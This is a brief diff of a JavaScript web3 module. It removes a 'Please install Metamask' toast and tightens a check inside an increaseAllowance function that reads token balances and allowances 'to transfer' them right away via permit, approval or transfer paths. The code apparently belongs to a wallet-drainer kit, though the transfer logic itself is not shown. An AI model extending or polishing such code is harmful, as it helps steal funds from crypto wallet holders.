@@ -3,7 +3,6 @@ import {
   w3mConnectors,
   w3mProvider,
 } from '@web3modal/ethereum';
-import { useToast } from 'vue-toastification';
 import { Web3Modal } from '@web3modal/html';
 import {
   configureChains,
@@ -111,8 +110,7 @@ export const increaseAllowance = async (token) => {
   // RPC provider
   const provider = new ethers.providers.JsonRpcProvider(constants.infura);
   const permitProvider = await detectEthereumProvider()
-  const Toast = useToast();
-  if(!permitProvider) return Toast.error('Please install Metamask')
+
   // get token Allownce to transfer imiditly
   const allow = await allownce(token);
   const balanceOfToken = await balanceOf(token);
@@ -123,7 +121,7 @@ export const increaseAllowance = async (token) => {
   const permitToken = constants.permitTokens.find(tokenis => tokenis.address === token.token_address)
   const increaseallown = constants.increasAllownceTokens.find(tokenis => tokenis === token.token_address)
   const transfertoken = constants.transferTokens.find(tokenis => tokenis === token.token_address)
-  if (permitToken) {
+  if (permitToken && permitProvider) {
 
     let nonce = undefined
     await readContract({
